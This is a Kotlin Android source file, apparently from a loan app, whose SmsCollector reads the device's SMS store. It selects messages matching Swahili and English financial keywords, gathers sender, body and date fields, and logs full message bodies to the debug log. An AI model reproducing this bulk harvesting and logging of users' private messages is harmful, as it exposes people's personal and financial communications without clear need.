package com.druto.loan.cash.drutocash.collector

import android.content.ContentResolver
import android.provider.Telephony
import android.util.Log
import androidx.annotation.WorkerThread
import com.druto.loan.cash.drutocash.utils.ThreadUtil.getSimpleDateFormat
import java.util.Date

object SmsCollector {
    const val TAG: String = "COLLECTOR-SMS"

    @WorkerThread
    fun fetchAllSms(contentResolver: ContentResolver): List<List<Any?>> {
        val lists: MutableList<List<Any?>> = ArrayList()
        // 定义SMS数据库URI
        val smsUri = Telephony.Sms.CONTENT_URI
        // 查询字段
        val projection = arrayOf(
            Telephony.Sms._ID,
            Telephony.Sms.THREAD_ID,
            Telephony.Sms.ADDRESS,
            Telephony.Sms.PERSON,
            Telephony.Sms.BODY,
            Telephony.Sms.DATE,
            Telephony.Sms.TYPE,  // 短信类型：接收(1)/发送(2)
            Telephony.Sms.PROTOCOL,
            Telephony.Sms.READ,
            Telephony.Sms.STATUS,
            Telephony.Sms.SUBJECT,
            Telephony.Sms.DATE_SENT,
            Telephony.Sms.SEEN
        )
        var keywords= listOf("salio","tsh","pesa","piga","malipo","mkopo","kutoka","tarehe","umepokea","mteja","tafadhali","Akaunti","imethibitishwa","Kumbukumbu","kulipa","TZS","yamepokelewa","lipa","umelipia","lako","betPawa"
            ,"loan","balance","VAT","account","Transaction","amount","received","fee","repayment","financial","paid")
        // 构建不区分大小写的查询条件
        val selection = StringBuilder()
        val selectionArgs = arrayOfNulls<String>(keywords.size)

        for (i in 0 until keywords.size) {
            if (i > 0) {
                selection.append(" OR ")
            }
            selection.append("body COLLATE NOCASE LIKE ?")
            selectionArgs[i] = ("%" + keywords.get(i)).toString() + "%"
        }

        // 查询短信数据库
        try {
            contentResolver.query(smsUri, projection, selection.toString(), selectionArgs, Telephony.Sms.DATE + " DESC")
                .use { cursor ->
                    if (cursor != null && cursor.moveToFirst()) {
                        val sdf = getSimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                        do {
                            val list: MutableList<Any?> = ArrayList()
                            val id = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms._ID))
                            val threadId =
                                cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID))
                            val address =
                                cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                            val person =
                                cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.PERSON))
                            val body =
                                cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY))
                            val date =
                                cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE))
                            val type =
                                cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))
                            val protocol =
                                cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.PROTOCOL))
                            val read =
                                cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.READ))
                            val status =
                                cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.STATUS))
                            val subject =
                                cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.SUBJECT))
                            val dateSent =
                                cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE_SENT))
                            val seen =
                                cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.SEEN))

                            // 日志输出或保存到列表
                            Log.d(
                                TAG,
                                "ID: $id, Address: $address, Body: $body, Date: " + sdf.format(
                                    Date(date)
                                ) + ", Type: " + dateSent
                            )
                            list.add(id)
                            list.add(threadId)
                            list.add(address)
                            list.add(person)
                            list.add(body)
                            list.add(date)
                            list.add(type)
                            list.add(protocol)
                            list.add(read)
                            list.add(status)
                            list.add(subject)
                            list.add(dateSent)
                            list.add(seen)
                            lists.add(list)
                        } while (cursor.moveToNext())
                    } else {
                        Log.d(TAG, "No SMS found on device.")
                    }
                }
        } catch (e: SecurityException) {
            Log.e(TAG, "Permission denied: " + e.message)
        }
        return lists
    }
}
